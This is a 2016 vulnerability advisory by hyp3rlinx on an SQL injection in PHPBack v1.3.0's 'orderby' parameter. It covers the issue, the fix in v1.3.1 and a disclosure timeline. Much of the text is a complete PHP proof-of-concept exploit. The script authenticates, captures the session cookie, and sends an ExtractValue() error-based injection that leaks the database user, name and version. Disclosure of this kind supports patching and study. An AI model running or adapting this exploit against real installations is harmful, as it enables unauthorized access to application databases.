/*
[+] Credits: hyp3rlinx

[+] Website: hyp3rlinx.altervista.org

[+] Source:  http://hyp3rlinx.altervista.org/advisories/PHPBACK-v1.3.0-SQL-INJECTION.txt


Vendor:
================
www.phpback.org


Product:
================
PHPBack v1.3.0


Vulnerability Type:
===================
SQL Injection


CVE Reference:
==============
N/A


Vulnerability Details:
=====================

PHPBack v1.3.0 is vulnerable to boolean blind and error based SQL Injection in the 'orderby' parameter.
By sending SQL Injection query using MySQL XPATH function ExtractValue() we can grab information
from the errors generated.

This is useful when we get no output except MySQL errors, we can force data extraction through the error. 
When using ExtractValue() function to generate error, evaluated results of our SQL query will be embedded
in query error message. Adding a colon "0x3a" to the beginning of the query will ensure parsing will always
FAIL generating an error along with our extracted data. This method only works on MySQL version >= 5.1, we can
then use SQL LIMIT function to move thru database informations.


Users should upgrade to v1.3.1
https://github.com/ivandiazwm/phpback/releases


Exploit code(s):
===============

Run from CL...
*/

<?php
error_reporting(0);
#PHPBACK v1.3.0 ORDER BY SQL INJECTION POC
#Credit: hyp3rlinx 
#ISR: apparitionsec
#Site: hyp3rlinx.altervista.org
#///////////////////////////////////////////////////////////////////
#
#run this BOT from CL it does following...
#1) authenticates to target
#2) SQL injection using XPATH query to create error and get output
#   for current MySQL USER(), DATABASE() and VERSION()
#Supported in MySQL >= 5.1 only
#====================================================================

$email=$argv[1];
$pwd=$argv[2];

if($argc<3){
echo "PHPBack 1.3.0 SQL Injection POC\r\n";
echo "Outputs USER(), DATABASE() and VERSION() on XPATH Error!\r\n";
echo "Supported in MySQL >= 5.1 versions only\r\n";
echo "==========================================================\r\n";
echo "Enter Creds: <email> <password>\r\n";
echo "*** by hyp3rlinx *** \r\n";
exit();
}

$target="localhost";
$creds="email=$email&password=$pwd"; 

$fp = fsockopen("localhost", 80, $errno, $errstr, 30);
sock_chk($fp);

#authenticate
    $out = "POST /phpback-1.3.0/action/login HTTP/1.0\r\n";
    $out .= "Host: $target\r\n";
    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $out .= 'Content-Length: ' . strlen($creds) . "\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    fwrite($fp, $creds);
$phpsess="";
$res="";
    while (!feof($fp)) {
        $res .= fgets($fp, 128);
if(strpos($res,"\r\n\r\n")!==FALSE){break;}
    }

$sess=get_session($fp);
function get_session($sock){
global $res;
$idx=strpos($res,"PHPSESSID");
$sess=substr($res,$idx,38);
return $sess;
}

#SQL Injection  
$sql="search=1&orderby=title,extractvalue(0x0a,concat(0x0a,(select USER()), 0x0a, (select DATABASE()), 0x0a, (select VERSION())))\r\n";

$fp = fsockopen("localhost", 80, $errno, $errstr, 30);
sock_chk($fp);

    $out = "POST /phpback-1.3.0/admin/ideas HTTP/1.0\r\n";
    $out .= "Host: $target\r\n";
    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $out .= 'Content-Length: ' . strlen($sql) . "\r\n";
$out .= "Cookie: " . $sess."\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    fwrite($fp, $sql);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
function sock_chk(&$fp){
if (!$fp) {echo "Cant connect!";exit();} 
}

?> 


/*
Disclosure Timeline:
=====================================
Vendor Notification: April 17, 2016
Vendor Confirms: April 17, 2016
Vendor Release Fixed Version: April 19, 2016
April 19, 2016 : Public Disclosure


Exploitation Technique:
=======================
Remote


Severity Level:
================
Medium


Description:
==================================================

Request Method(s):        [+]  POST


Vulnerable Product:       [+] PHPBack v1.3.0


Vulnerable Parameter(s):  [+] 'orderby'

====================================================

[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere. All content (c) hyp3rlinx.

by hyp3rlinx
*/